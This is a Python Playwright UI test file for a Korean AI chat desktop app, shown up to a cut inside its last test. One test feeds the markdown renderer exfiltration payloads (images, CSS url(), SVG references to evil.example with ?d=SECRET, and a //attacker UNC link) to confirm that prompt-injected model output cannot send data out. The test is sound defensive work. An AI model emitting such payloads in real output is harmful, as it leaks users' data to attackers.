# SPDX-FileCopyrightText: 2026 Beomjoon Kim
# SPDX-License-Identifier: AGPL-3.0-only
"""화면 통합 점검: 실제 Bridge에 붙은 web/ 화면을 Chromium(Playwright)으로 열어 '연결·도구' 창을 조작한다.

Playwright가 없으면(기본 CI) 건너뛴다. 스크린숏은 POSTECH_UI_SHOTS 폴더가 주어지면 거기에 남긴다.
"""
import importlib.util
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

CARD_HAS = "([name, text]) => [...document.querySelectorAll('.conn-card')].some((c) => c.innerText.includes(name) && c.innerText.includes(text))"
HAVE_PLAYWRIGHT = importlib.util.find_spec("playwright") is not None
CHROMIUM = os.environ.get("PLAYWRIGHT_CHROMIUM") or ("/opt/pw-browsers/chromium" if os.path.exists("/opt/pw-browsers/chromium") else None)


@unittest.skipUnless(HAVE_PLAYWRIGHT, "Playwright가 없어 화면 점검을 건너뜁니다")
class UiSmokeTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        import ui_harness
        from support import isolated_app_dir, preserved_hooks

        cls.saved_env = {k: os.environ.get(k) for k in ("APPDATA", "POSTECH_CHAT_SECRETS")}
        cls.hooks = preserved_hooks()
        cls.hooks.__enter__()
        cls.isolation = isolated_app_dir()
        data_dir = cls.isolation.__enter__()  # 다른 테스트가 storage를 먼저 불러왔어도 임시 폴더를 쓴다
        cls.bridge, cls.events = ui_harness.make_bridge(data_dir)
        cls.bridge.save_settings({"api_key": "test-key"})  # 첫 실행 설정 창이 뜨지 않게
        cls.server = ui_harness.serve(cls.bridge, cls.events)
        cls.url = f"http://127.0.0.1:{cls.server.server_address[1]}/"
        cls.init_script = ui_harness.INIT_SCRIPT
        cls.shots = os.environ.get("POSTECH_UI_SHOTS")

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()
        cls.bridge._mcp.shutdown()
        for k, v in cls.saved_env.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
        cls.isolation.__exit__(None, None, None)
        cls.hooks.__exit__(None, None, None)

    def shot(self, page, name):
        if self.shots:
            os.makedirs(self.shots, exist_ok=True)
            page.screenshot(path=os.path.join(self.shots, f"{name}.png"), full_page=False)

    def open(self, p, width=1240, height=860):
        browser = p.chromium.launch(**({"executable_path": CHROMIUM} if CHROMIUM else {}))
        page = browser.new_page(viewport={"width": width, "height": height})
        errors = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        page.on("console", lambda m: errors.append(m.text) if m.type == "error" else None)
        page.add_init_script(self.init_script)
        page.goto(self.url)
        page.wait_for_selector("#btn-mcp")
        return browser, page, errors

    def test_usage_slash_command(self):
        """1.18.1: 채팅의 /usage — 슬래시 메뉴에 보이고, 보내면 사용량 창이 뜬다(대화로 보내지 않음)."""
        from playwright.sync_api import sync_playwright

        with sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                page.fill("#input", "/us")
                page.dispatch_event("#input", "input")
                page.wait_for_selector("#slash-menu .slash-item:has-text('/usage')")
                page.fill("#input", "/usage")
                page.dispatch_event("#input", "input")
                page.press("#input", "Enter")   # 메뉴에서 고르기 → "/usage "
                page.press("#input", "Enter")   # 보내기
                page.wait_for_selector(".modal:has-text('사용량') :text('최근 30일')")
                self.assertEqual(page.input_value("#input"), "")
                self.assertEqual([e for e in errors if "favicon" not in e], [])
            finally:
                browser.close()

    def test_update_dialog_can_cancel_the_download(self):
        """2.3.1: 업데이트를 받는 중에 '취소'를 누르면 내려받기를 멈추고(cancel_update) 한 번만 알린다."""
        from playwright.sync_api import sync_playwright

        calls = []
        saved = self.bridge.download_update, self.bridge.cancel_update
        self.bridge.download_update = lambda: calls.append("download") or {"ok": True}
        self.bridge.cancel_update = lambda: calls.append("cancel") or {"ok": True}
        try:
            with sync_playwright() as p:
                browser, page, errors = self.open(p)
                try:
                    page.evaluate("startUpdate({ version: '9.9.9' })")
                    page.wait_for_selector(".modal:has-text('업데이트') .modal-foot button:has-text('취소')")
                    page.evaluate("updateEvent({ type: 'update', kind: 'progress', done: 5 * 1048576, total: 20 * 1048576 })")
                    page.wait_for_selector(".modal:has-text('5.0 MB')")
                    self.shot(page, "update-downloading")
                    page.click(".modal-foot button:has-text('취소')")
                    page.wait_for_selector("#toast:has-text('이어서 받습니다')")
                    self.assertEqual(calls, ["download", "cancel"])
                    # 뒤이어 오는 '취소했습니다' 오류 이벤트는 다시 알리지 않는다
                    page.evaluate("updateEvent({ type: 'update', kind: 'error', error: '내려받기를 취소했습니다.', cancelled: true })")
                    page.wait_for_timeout(200)
                    self.assertEqual(page.locator("#toast:has-text('업데이트하지 못했습니다')").count(), 0)
                    # 다 받은 뒤(설치 시작) 창을 닫아도 취소하지 않는다
                    page.evaluate("startUpdate({ version: '9.9.9' })")
                    page.wait_for_selector(".modal .modal-foot button:has-text('취소')")
                    page.evaluate("updateEvent({ type: 'update', kind: 'installing', message: '설치 프로그램을 열었습니다.' })")
                    self.assertEqual(page.locator(".modal .modal-foot").count(), 0)
                    page.keyboard.press("Escape")
                    page.wait_for_timeout(100)
                    self.assertEqual(calls, ["download", "cancel", "download"])
                    self.assertEqual([e for e in errors if "favicon" not in e], [])
                finally:
                    browser.close()
        finally:
            self.bridge.download_update, self.bridge.cancel_update = saved

    def test_markdown_blocks_external_images_and_unsafe_links(self):
        """프롬프트 인젝션이 모델 출력의 이미지·링크로 자료를 밖으로 보내지 못한다(외부 요청 0건). 수식·data 이미지는 그대로."""
        from playwright.sync_api import sync_playwright

        md = ("![leak](https://evil.example/?d=SECRET) <img src='//evil.example/b.png'>\n"
              "[unc](//attacker/share/a.exe) [rel](foo.html) [ok](https://example.com/p)\n\n"
              "<p style=\"background:url(https://evil.example/bg)\">bg</p><style>p{background:url(https://evil.example/c)}</style>\n\n"
              "<svg width=10 height=10><rect width=\"10\" height=\"10\" fill=\"url(https://evil.example/fill)\" "
              "mask=\"url( 'https://evil.example/mask' )\" filter=\"URL(https://evil.example/f)\"/>"
              "<filter><feImage href=\"https://evil.example/fe\"/></filter><rect fill=\"url(#ok)\"/></svg>\n\n"
              "<span style=\"background:\\75 rl(https://evil.example/esc)\">x</span> "
              "<span style=\"background-image:image-set('https://evil.example/is' 1x)\">y</span>\n\n"
              "![d](data:image/png;base64,iVBORw0KGgo=) $\\sqrt{y}$")
        with sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                reqs = []
                page.on("request", lambda r: reqs.append(r.url))
                html = page.evaluate("(md) => { const n = renderMarkdown(md); document.body.append(n); return n.innerHTML; }", md)
                page.wait_for_timeout(300)
                self.assertEqual([u for u in reqs if "evil" in u or "attacker" in u], [])
                self.assertNotIn("evil.example/bg", html.split("md-blocked-img")[0])
                self.assertNotIn("<style", html)
                self.assertNotIn('href="//attacker', html)
                self.assertNotIn('href="foo.html"', html)
                self.assertIn('href="https://example.com/p"', html)
                self.assertIn('src="data:image/png', html)
                self.assertIn('class="katex', html)
                self.assertIn("url(#ok)", html)   # 문서 안 참조는 남는다
            finally:
                browser.close()

    def test_hub_connectors_and_mcp_tabs(self):
        from playwright.sync_api import sync_playwright

        with sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                page.click("#btn-mcp")
                page.wait_for_selector(".hub-tab.active")
                page.wait_for_selector(".conn-card")
                cards = page.locator(".conn-card")
                self.assertGreaterEqual(cards.count(), 7)
                github = cards.filter(has_text="GitHub").first
                self.assertIn("비활성화", github.inner_text())
                self.shot(page, "hub-connectors")
                # GitHub 켜기 → 인증 필요
                github.locator("input[type=checkbox]").first.check()
                page.wait_for_function(CARD_HAS, arg=["GitHub", "인증 필요"])
                # 토큰 저장 → 연결됨(확인 전)
                github.locator("summary").first.click()
                github = page.locator(".conn-card").filter(has_text="GitHub").first
                github.locator("input[type=password]").first.fill("github_pat_uitest1234567890")
                github.locator("button", has_text="저장").first.click()
                page.wait_for_function(CARD_HAS, arg=["GitHub", "연결됨"])
                self.assertTrue(self.bridge.get_connectors()["connectors"][0]["secrets"][0]["has"])
                self.assertNotIn("github_pat_uitest", page.content())  # 저장한 토큰은 화면으로 돌아오지 않는다
                # 도구 정책: 전송 도구는 '묻지 않고 허용'을 고를 수 없다
                review = page.locator(".policy-table tr", has_text="create_pull_review").first
                self.assertTrue(review.locator("option[value=allow]").is_disabled())
                review.locator("select").select_option("deny")
                page.wait_for_timeout(300)
                policy = self.bridge._config["connectors"]["github"]["policy"]
                self.assertEqual(policy["create_pull_review"], "deny")
                self.shot(page, "hub-github-open")
                # MCP 탭: 기존 내장 서버와 켠 커넥터 서버가 보인다
                page.click(".hub-tab:has-text('MCP 서버')")
                page.wait_for_selector(".hub-panel .skill-item")
                text = page.locator(".hub-panel").inner_text()
                for name in ("word", "paper", "notion", "github"):
                    self.assertIn(name, text)
                self.shot(page, "hub-mcp")
                self.assertEqual(errors, [])
            finally:
                browser.close()

    def test_research_tab_indexes_the_workspace_and_cites_sources(self):
        from playwright.sync_api import sync_playwright

        ws = os.path.join(os.environ["APPDATA"], "ws")  # make_bridge가 데이터 폴더(임시)로 바꿔 둔 값
        os.makedirs(ws, exist_ok=True)
        with open(os.path.join(ws, "notes.md"), "w", encoding="utf-8") as f:
            f.write("# 실험 기록\n학습률을 0.001로 낮췄더니 손실이 안정되었다.\n")
        self.bridge._config["workspace"] = ws
        with sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                # 1.11: 연구 라이브러리는 PO노트처럼 사이드바에서 여는 본문 화면이다
                page.click("#btn-research")
                page.wait_for_selector("#tool-view .tool-start")
                self.assertTrue(page.is_hidden("#composer-wrap"))
                self.assertEqual(page.inner_text("#chat-title"), "연구 라이브러리")
                page.click("button:has-text('연구 워크스페이스 켜기')")
                page.wait_for_selector("text=에이전트 도구 켜기")
                page.click("#tool-view .po-tab:has-text('문서 검색')")
                page.click("button:has-text('작업 폴더 인덱싱')")
                page.wait_for_selector("text=인덱싱 완료", timeout=20000)
                box = page.locator("input[placeholder^='인덱스에서 찾기']")
                box.fill("학습률 손실")
                box.press("Enter")
                page.wait_for_selector(".rag-hit")
                self.assertIn("[1] 원문 · notes.md §실험 기록", page.locator(".rag-hit").first.inner_text())
                self.shot(page, "page-research")
                page.click("#tool-view .po-tab:has-text('논문')")
                page.wait_for_selector("text=논문 더하기")
                # 새 채팅을 누르면 채팅 화면으로 돌아온다
                page.evaluate("document.querySelector('#btn-expand').hidden || document.querySelector('#btn-expand').click()")  # 1.19: 도구 화면은 사이드바를 접지 않는다
                page.click("#btn-new")
                page.wait_for_selector("#tool-view", state="hidden")
                self.assertTrue(page.is_visible("#composer-wrap"))
                self.assertFalse(page.locator("#btn-research").evaluate("b => b.classList.contains('active')"))
                self.assertEqual(errors, [])
            finally:
                browser.close()

    def test_memory_tab_adds_memory_and_turns_on_encrypted_sync(self):
        from playwright.sync_api import sync_playwright

        ws = os.path.join(os.environ["APPDATA"], "proj")
        shared = os.path.join(os.environ["APPDATA"], "cloud")
        os.makedirs(ws, exist_ok=True)
        os.makedirs(shared, exist_ok=True)
        self.bridge._config["workspace"] = ws
        with sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                page.evaluate("showHub('memory')")
                page.wait_for_selector(".hub-panel .feature-toggle")
                page.locator(".feature-toggle", has_text="통합 메모리").locator("input").check()
                page.wait_for_selector("text=에이전트 도구 켜기")
                page.fill(".hub-panel textarea", "배포는 금요일에 하지 않기로 함")
                page.locator(".hub-panel select").nth(2).select_option("decision")
                page.click("button:has-text('남기기')")
                page.wait_for_selector(".mem-text:has-text('배포는 금요일')")
                self.assertIn("default/proj", page.locator(".hub-panel").inner_text())
                page.locator(".feature-toggle", has_text="클라우드 동기화").locator("input").check()
                page.wait_for_selector("text=동기화 켜기")
                page.fill("input[placeholder='동기화 폴더 경로']", shared)
                page.fill("input[placeholder^='동기화 암호']", "correct horse battery")
                page.fill("input[placeholder='한 번 더']", "correct horse battery")
                page.click("button:has-text('동기화 켜기')")
                page.wait_for_selector("text=동기화했습니다", timeout=30000)
                self.assertTrue(os.path.exists(os.path.join(shared, "poschat-sync", "meta.json")))
                with open(os.path.join(shared, "poschat-sync", "meta.json"), encoding="utf-8") as f:
                    self.assertNotIn("correct horse", f.read())
                self.shot(page, "hub-memory")
                self.assertEqual(errors, [])
            finally:
                browser.close()
                self.bridge.sync_disconnect()

    def test_automation_tab_registers_an_ssh_host(self):
        from playwright.sync_api import sync_playwright

        with sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                page.click("#btn-auto")
                page.click("button:has-text('에이전트 자동화 켜기')")
                page.wait_for_selector("#tool-view .po-tab:has-text('Python · Jupyter')")
                page.locator(".feature-toggle", has_text="Python·Jupyter 실행").locator("input").check()
                page.wait_for_selector("#tool-view .po-tab:has-text('Python · Jupyter') small")  # '켜짐'
                page.click("#tool-view .po-tab:has-text('원격 서버')")
                page.fill("input[placeholder^='별칭']", "gpu1")
                page.fill("input[placeholder^='호스트']", "gpu.example.ac.kr")
                page.fill("input[placeholder='사용자']", "kim")
                page.fill("input[placeholder^='허용 명령']", "nvidia-smi, python train.py")
                page.click("button:has-text('등록')")
                page.wait_for_selector("td.mono:has-text('gpu1')")
                hosts = self.bridge._config["automation"]["ssh"]["hosts"]
                self.assertEqual(hosts["gpu1"]["allowed_commands"], ["nvidia-smi", "python train.py"])
                python = next(c for c in self.bridge.get_connectors()["connectors"] if c["id"] == "python")
                self.assertTrue(python["enabled"])
                self.shot(page, "page-automation")
                # 연결·도구 창에서는 더 이상 탭으로 보이지 않는다(예전 이름으로 부르면 화면을 연다)
                page.evaluate("document.querySelector('#btn-expand').hidden || document.querySelector('#btn-expand').click()")  # 1.19: 도구 화면은 사이드바를 접지 않는다
                page.click("#btn-mcp")
                page.wait_for_selector(".hub-tab.active")
                tabs = page.locator(".hub-tab").all_inner_texts()
                self.assertNotIn("연구 라이브러리", tabs)
                self.assertNotIn("에이전트 자동화", tabs)
                self.assertEqual(errors, [])
            finally:
                browser.close()

    def test_feedback_shows_up_in_diagnostics(self):
        from playwright.sync_api import sync_playwright

        import storage
        import telemetry

        thread = self.bridge.new_thread()
        thread = storage.load_thread(thread["id"])
        thread["title"] = "평가 테스트"
        thread["messages"] += [storage.make_message("user", "안녕"),
                               storage.make_message("assistant", "안녕하세요! 무엇을 도와드릴까요?", model="claude-sonnet-5-5")]
        storage.save_thread(thread)
        telemetry.record("llm_call", mode="chat_completions", model="claude-sonnet-5-5", ok=True, ms=850,
                         input_tokens=500, output_tokens=150)
        with sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                page.evaluate(f"openThread('{thread['id']}')")
                page.wait_for_selector(".msg.assistant .msg-actions button[title='좋은 답변']")
                page.click(".msg.assistant .msg-actions button[title='좋은 답변']")
                page.wait_for_selector(".msg.assistant .msg-actions button.active")
                self.assertEqual(storage.load_thread(thread["id"])["messages"][1]["feedback"], 1)
                page.evaluate("showHub('diagnostics')")
                page.wait_for_selector(".diag-table")
                row = page.locator(".diag-table tr", has_text="claude-sonnet-5-5").first.inner_text()
                self.assertIn("850ms", row)
                self.assertIn("\t28\t", row)  # 크레딧: 24 + 500/250 + 150/75 = 28
                self.shot(page, "hub-diagnostics")
                self.assertEqual(errors, [])
            finally:
                browser.close()

    def test_hub_fits_a_phone_screen(self):
        from playwright.sync_api import sync_playwright

        with sync_playwright() as p:
            browser, page, errors = self.open(p, 390, 844)
            try:
                page.evaluate("showHub('connectors')")
                page.wait_for_selector(".conn-card")
                overflow = page.evaluate("document.querySelector('.modal').scrollWidth - document.querySelector('.modal').clientWidth")
                self.assertLessEqual(overflow, 1)
                self.shot(page, "hub-phone")
                self.assertEqual(errors, [])
            finally:
                browser.close()

    def test_tool_pages_fit_a_phone_screen(self):
        from playwright.sync_api import sync_playwright

        self.bridge.set_feature("research", True)
        self.bridge.set_feature("automation", True)
        try:
            with sync_playwright() as p:
                browser, page, errors = self.open(p, 390, 844)
                try:
                    for button, name in (("#btn-research", "research"), ("#btn-auto", "automation")):
                        page.evaluate("setCollapsed(false)")  # 휴대폰에서는 사이드바가 서랍이다
                        page.click(button)
                        page.wait_for_selector("#tool-view .po-tabs")
                        self.assertTrue(page.evaluate("document.querySelector('#app').classList.contains('collapsed')"))
                        overflow = page.evaluate("document.querySelector('#tool-view').scrollWidth - document.querySelector('#tool-view').clientWidth")
                        self.assertLessEqual(overflow, 1)
                        page.wait_for_timeout(300)  # 사이드바 서랍이 닫히는 움직임(0.2초)이 끝난 뒤 찍는다
                        self.shot(page, f"page-{name}-phone")
                    self.assertEqual(errors, [])
                finally:
                    browser.close()
        finally:
            self.bridge.set_feature("research", False)
            self.bridge.set_feature("automation", False)

    def test_plugins_page_installs_a_plugin_and_uses_its_skill(self):
        from playwright.sync_api import sync_playwright

        import plugins
        from test_plugins import marketplace_zip

        plugins._catalog_dir().mkdir(parents=True, exist_ok=True)
        plugins._archive().write_bytes(marketplace_zip())
        plugins._write_json(plugins._catalog_file(), plugins.build_catalog())
        try:
            with sync_playwright() as p:
                for width, height in ((1240, 860), (390, 844)):
                    browser, page, errors = self.open(p, width, height)
                    try:
                        if width < 700:
                            page.evaluate("setCollapsed(false)")
                        page.click("#btn-plugins")
                        page.wait_for_selector(".plugin-card")
                        self.assertEqual(page.inner_text("#chat-title"), "플러그인")
                        cards = page.locator(".plugin-card")
                        self.assertEqual(cards.first.locator("h3").inner_text(), "Productivity")
                        # 검색: 스킬 설명으로도 찾는다
                        page.fill("#plugin-search", "annotate")
                        page.wait_for_function("document.querySelectorAll('.plugin-card').length === 1")
                        self.assertIn("PDF Viewer", page.locator(".plugin-card").inner_text())
                        page.fill("#plugin-search", "")
                        overflow = page.evaluate("document.querySelector('#tool-view').scrollWidth - document.querySelector('#tool-view').clientWidth")
                        self.assertLessEqual(overflow, 1)
                        self.shot(page, f"page-plugins-{width}")
                        if width < 700:
                            self.assertEqual(errors, [])
                            continue
                        prod = page.locator(".plugin-card", has_text="Productivity")
                        prod.locator("button", has_text="설치").click()
                        page.wait_for_selector(".plugin-card.installed")
                        self.assertTrue(plugins.installed()["productivity"]["enabled"])
                        switch = page.locator(".plugin-card.installed [role=switch]")
                        self.assertEqual(switch.get_attribute("aria-checked"), "true")
                        switch.click()
                        page.wait_for_selector("[role=switch][aria-checked=false]")
                        self.assertFalse(plugins.installed()["productivity"]["enabled"])
                        page.click("[role=switch][aria-checked=false]")
                        page.wait_for_selector("[role=switch][aria-checked=true]")
                        page.click(".po-tab:has-text('설치됨')")
                        page.click(".plugin-card button:has-text('스킬 보기')")
                        dialog = page.wait_for_selector("[role=dialog]")
                        self.assertIn("/productivity:start", dialog.inner_text())
                        self.assertIn("slack", dialog.inner_text())  # 외부 도구 안내
                        self.shot(page, "plugin-detail")
                        page.click("button[aria-label='/productivity:start 대화에서 쓰기']")
                        page.wait_for_selector("#tool-view", state="hidden")
                        self.assertEqual(page.input_value("#input"), "/productivity:start ")
                        # 다른 저장소 탭은 홈페이지만 보인다
                        page.evaluate("document.querySelector('#btn-expand').hidden || document.querySelector('#btn-expand').click()")  # 1.19: 도구 화면은 사이드바를 접지 않는다
                        page.click("#btn-plugins")
                        page.click(".po-tab:has-text('다른 저장소')")
                        self.assertIn("홈페이지", page.locator(".plugin-card").first.inner_text())
                        self.assertEqual(errors, [])
                    finally:
                        browser.close()
        finally:
            plugins.remove("productivity")

    def test_browser_bar_opens_pages_and_attaches_them_to_chat(self):
        from unittest.mock import patch

        from playwright.sync_api import sync_playwright

        import browser_api
        from test_browser import FakeBackend

        backends = []

        def factory(b):
            backends.append(FakeBackend(b))
            return backends[-1]

        self.bridge._browser_obj = None
        with patch.object(browser_api, "android_factory", factory), sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                button = page.wait_for_selector("#btn-browser:not([hidden])")
                self.assertEqual(button.get_attribute("aria-pressed"), "false")
                page.click("#btn-browser")
                page.wait_for_selector("#browser-bar:not([hidden])")
                self.assertEqual(page.get_attribute("#btn-browser", "aria-pressed"), "true")
                self.assertTrue(page.is_visible("#composer-wrap"))  # 채팅은 그대로 옆에 남는다
                page.fill("#browser-address", "arxiv.org/abs/1706.03762")
                page.press("#browser-address", "Enter")
                page.wait_for_function("document.querySelector('#browser-status').textContent.includes('Attention')")
                # 주소 칸은 browser_open의 응답을 받은 뒤 채운다. 페이지 제목 이벤트가 응답보다 먼저 올 수 있어 값이 바뀌기를 기다린다
                page.wait_for_function("document.querySelector('#browser-address').value.startsWith('https://')", timeout=10000)
                self.assertEqual(page.input_value("#browser-address"), "https://arxiv.org/abs/1706.03762")
                self.assertIn(("open", "https://arxiv.org/abs/1706.03762"), backends[0].calls)
                self.assertFalse(page.is_disabled("#browser-back"))
                page.click("#browser-ask-page")
                page.wait_for_selector("#attach-tray .tray-item.ready")
                self.assertIn("웹페이지 - Attention", page.inner_text("#attach-tray"))
                self.assertEqual(page.input_value("#input"), "이 페이지의 핵심을 요약해 줘.")
                self.shot(page, "browser-bar")
                # 막힌 주소는 알림만 띄우고 열지 않는다
                page.fill("#browser-address", "file:///C:/Windows")
                page.press("#browser-address", "Enter")
                # 앞의 '첨부했습니다' 알림이 아직 떠 있을 수 있으므로 알림 글이 바뀌기를 기다린다
                page.wait_for_function("!document.querySelector('#toast').hidden && "
                                       "document.querySelector('#toast').textContent.includes('http·https')")
                # 도구 화면으로 가면 막대를 숨기고, 돌아오면 다시 보인다
                page.evaluate("document.querySelector('#btn-expand').hidden || document.querySelector('#btn-expand').click()")  # 1.19: 도구 화면은 사이드바를 접지 않는다
                page.click("#btn-research")
                page.wait_for_selector("#browser-bar", state="hidden")
                page.evaluate("document.querySelector('#btn-expand').hidden || document.querySelector('#btn-expand').click()")  # 1.19: 도구 화면은 사이드바를 접지 않는다
                page.click("#btn-new")
                page.wait_for_selector("#browser-bar:not([hidden])")
                page.click("button[aria-label='브라우저 닫기']")
                page.wait_for_selector("#browser-bar", state="hidden")
                self.assertIn(("hide",), backends[0].calls)
                self.assertEqual(errors, [])
            finally:
                browser.close()
                self.bridge._browser_obj = None

    def test_paper_pane_renders_pdf_and_attaches_selection_page_and_region(self):
        import tempfile

        from playwright.sync_api import sync_playwright

        import research_library
        from test_paper import PAGES, make_pdf

        with tempfile.TemporaryDirectory() as tmp:
            pdf = os.path.join(tmp, "attention.pdf")
            with open(pdf, "wb") as f:
                f.write(make_pdf(PAGES))
            other = research_library.add({"title": "UI Paper B", "doi": "10.1/uib", "abstract": "Results: 91%."})[0]
            mine = research_library.add({"title": "UI Paper A", "pdf": pdf})[0]
            with sync_playwright() as p:
                browser, page, errors = self.open(p)
                try:
                    page.click("#btn-paper")
                    page.wait_for_selector("#paper-pane:not([hidden])")
                    self.assertEqual(page.get_attribute("#btn-paper", "aria-pressed"), "true")
                    self.assertTrue(page.is_visible("#composer-wrap"))  # 채팅은 옆에 그대로
                    page.wait_for_selector(".paper-lib-row:has-text('UI Paper A')")
                    # 비교: 두 편을 골라 첨부와 질문을 만든다
                    page.check(f"input[aria-label='비교에 넣기: UI Paper A']")
                    page.check(f"input[aria-label='비교에 넣기: UI Paper B']")
                    page.click("#paper-compare")
                    page.wait_for_function("document.querySelectorAll('#attach-tray .tray-item.ready').length === 2")
                    self.assertIn("표로", page.input_value("#input"))
                    page.evaluate("clearTray(); document.querySelector('#input').value = ''")
                    # 파일 열기 → PDF.js가 쪽과 글자 층을 그린다
                    page.set_input_files("#paper-pane input[type=file]", pdf)
                    page.wait_for_selector(".pdf-page[data-page='1'] canvas")
                    page.wait_for_selector(".pdf-page[data-page='1'] .textLayer span")
                    self.assertEqual(page.locator(".pdf-page").count(), 4)
                    self.assertIn("/ 4", page.inner_text(".paper-pager"))
                    self.shot(page, "paper-reader")
                    # 3쪽으로 가서 글자를 드래그한 것처럼 고른 뒤 묻기
                    page.fill("#paper-page", "3")
                    page.dispatch_event("#paper-page", "change")
                    page.wait_for_function("PAPER.page === 3 && document.querySelector('#paper-page').value === '3'")
                    page.wait_for_timeout(600)  # 부드러운 스크롤이 끝나기를 기다린다
                    page.wait_for_selector(".pdf-page[data-page='3'] .textLayer span")
                    page.evaluate("""() => {
                        const span = document.querySelector(".pdf-page[data-page='3'] .textLayer span");
                        const r = document.createRange(); r.selectNodeContents(span);
                        getSelection().removeAllRanges(); getSelection().addRange(r);
                    }""")
                    page.click("#paper-ask-selection")
                    page.wait_for_selector("#attach-tray .tray-item.ready:has-text('선택 -')")
                    self.assertIn("선택한 부분", page.input_value("#input"))
                    page.evaluate("document.querySelector('#input').value = ''")
                    page.click("#paper-ask-page")
                    page.wait_for_selector("#attach-tray .tray-item.ready:has-text('p3 -')")
                    # 영역 잘라 묻기: 1쪽 위쪽을 드래그한다
                    page.evaluate("document.querySelector('#input').value = ''")
                    page.click("#paper-capture")
                    self.assertEqual(page.get_attribute("#paper-capture", "aria-pressed"), "true")
                    page.evaluate("paperGo(1, true)")
                    page.wait_for_timeout(300)
                    box = page.locator(".pdf-page[data-page='1']").bounding_box()
                    page.mouse.move(box["x"] + 20, box["y"] + 20)
                    page.mouse.down()
                    page.mouse.move(box["x"] + 260, box["y"] + 120, steps=5)
                    page.mouse.up()
                    page.wait_for_selector("#attach-tray .tray-item.ready:has-text('그림 p1')")
                    self.assertEqual(page.get_attribute("#paper-capture", "aria-pressed"), "false")
                    self.assertIn("그림", page.input_value("#input"))
                    self.shot(page, "paper-attached")
                    # 라이브러리에 저장(연구 라이브러리가 꺼져 있으면 안내)
                    page.click("#paper-save")
                    page.wait_for_function("document.querySelector('#toast').textContent.includes('연구 라이브러리')")
                    # 휴대폰 폭: 논문 화면이 채팅을 덮고, 묻기를 누르면 채팅으로 돌아간다
                    page.set_viewport_size({"width": 400, "height": 800})
                    page.wait_for_timeout(300)
                    self.assertFalse(page.is_visible("#composer-wrap"))
                    page.evaluate("setCollapsed(true)")  # 창 크기만 바꾼 경우: 휴대폰처럼 서랍을 닫는다
                    self.shot(page, "paper-phone")
                    page.click("#paper-ask-page")
                    page.wait_for_selector("#paper-pane", state="hidden")
                    self.assertTrue(page.is_visible("#composer-wrap"))
                    page.set_viewport_size({"width": 1240, "height": 860})
                    page.evaluate("paperShow()")  # 사이드바가 닫혀 있으므로 직접 다시 연다(같은 논문)
                    page.wait_for_selector(".pdf-page[data-page='1'] canvas")
                    page.click("button[aria-label='논문 화면 닫기']")
                    page.wait_for_selector("#paper-pane", state="hidden")
                    self.assertEqual(errors, [])
                finally:
                    browser.close()
                    research_library.remove(mine["id"])
                    research_library.remove(other["id"])
                    self.bridge._paper_current = None

    def test_settings_switch_to_the_personal_claude_api(self):
        from playwright.sync_api import sync_playwright

        with sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                page.evaluate("showSettings()")
                mode = page.locator(".modal select").nth(0)
                self.assertEqual(mode.input_value(), "chat_completions")  # 기본은 POSTECH GenAI
                self.assertFalse(page.is_visible("text=Claude API 키 (Anthropic)"))
                mode.select_option("anthropic")
                page.wait_for_selector("text=Claude API 키 (Anthropic)")
                page.click(".modal-foot button.primary")
                page.wait_for_selector("text=Claude API 키를 입력하세요")  # 키 없이는 저장하지 않는다
                page.fill("input[placeholder='sk-ant-...']", "sk-ant-uitest-0123456789abcdef")
                page.locator(".modal select:visible", has=page.locator("option[value='claude-sonnet-5-5']")).select_option("claude-sonnet-5-5")
                self.shot(page, "settings-claude")
                page.click(".modal-foot button.primary")
                page.wait_for_selector(".modal", state="detached")
                config = self.bridge._config
                self.assertEqual((config["api_mode"], config["anthropic_model"]), ("anthropic", "claude-sonnet-5-5"))
                self.assertEqual(config["anthropic_api_key"], "sk-ant-uitest-0123456789abcdef")
                self.assertEqual(config["api_key"], "test-key")  # POSTECH 키는 그대로
                self.assertNotIn("sk-ant-uitest", page.content())  # 저장한 키는 화면으로 돌아오지 않는다
                page.wait_for_function("document.querySelector('#thread-model').value === 'claude-sonnet-5-5'")
                self.assertEqual(errors, [])
            finally:
                browser.close()
                self.bridge.save_settings({"api_mode": "chat_completions", "clear_anthropic_key": True})

    def test_settings_switch_to_the_personal_gpt_api(self):
        """1.18: 일반 AI 모델(GPT) — 내 OpenAI API 키. 키 없이는 저장하지 않고, 저장하면 대화 모델이 GPT 목록으로 바뀐다."""
        from playwright.sync_api import sync_playwright

        with sync_playwright() as p:
            browser, page, errors = self.open(p)
            try:
                page.evaluate("showSettings()")
                mode = page.locator(".modal select").nth(0)
                self.assertTrue(page.is_hidden("#openai-box"))
                mode.select_option("openai")
                page.wait_for_selector("#openai-box:not([hidden])")
                self.assertTrue(page.is_hidden("text=Claude API 키 (Anthropic)"))
                page.click(".modal-foot button.primary")
                page.wait_for_selector("text=OpenAI API 키를 입력하세요")
                page.fill("#openai-key", "sk-uitest-openai-0123456789")
                page.select_option("#openai-model", "gpt-5-mini")
                self.shot(page, "settings-gpt")
                page.click(".modal-foot button.primary")
                page.wait_for_selector(".modal", state="detached")
                config = self.bridge._config
                self.assertEqual((config["api_mode"], config["openai_model"]), ("openai", "gpt-5-mini"))
                self.assertEqual(config["openai_api_key"], "sk-uitest-openai-0123456789")
                self.assertNotIn("sk-uitest-openai", page.content())
                page.wait_for_function("document.querySelector('#thread-model').value === 'gpt-5-mini'")
                self.assertEqual(errors, [])
            finally:
                browser.close()
                self.bridge.save_settings({"api_mode": "chat_completions", "clear_openai_key": True})

    def test_settings_show_the_license_source_and_third_party_licenses(self):
        from playwright.sync_api import sync_playwright
        from version import APP_VERSION

        with sync_playwright() as p:
            for width, height in ((1240, 860), (390, 844)):
                browser, page, errors = self.open(p, width, height)
                try:
                    page.evaluate("showSettings()")
                    block = page.wait_for_selector(".license-block")
                    block.scroll_into_view_if_needed()
                    text = block.inner_text()
